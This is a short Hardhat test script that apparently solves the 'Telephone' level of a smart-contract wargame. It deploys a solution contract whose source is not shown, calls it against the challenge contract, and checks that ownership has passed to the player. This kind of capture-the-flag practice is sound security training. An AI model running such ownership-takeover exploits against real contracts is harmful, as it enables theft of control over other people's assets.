const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0x566941026F23949Cb73aaA0F076f8D30f70E4667"

describe("04 Telephone", function () {
    let player, challengeContract, solutionContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Telephone",
            CONTRACT_ADDRESS,
            player
        )
        solutionContract = await (
            await ethers.getContractFactory("TelephoneSolution", player)
        ).deploy(CONTRACT_ADDRESS)
        const ownerBefore = await challengeContract.owner()
        await assert.notEqual(ownerBefore.toString(), player.address.toString())
    })

    it("Execution", async function () {
        const txResponse = await solutionContract.solveChallenge()
        await txResponse.wait(1)
    })

    after(async function () {
        const ownerAfter = await challengeContract.owner()
        await assert.equal(ownerAfter.toString(), player.address.toString())
    })
})
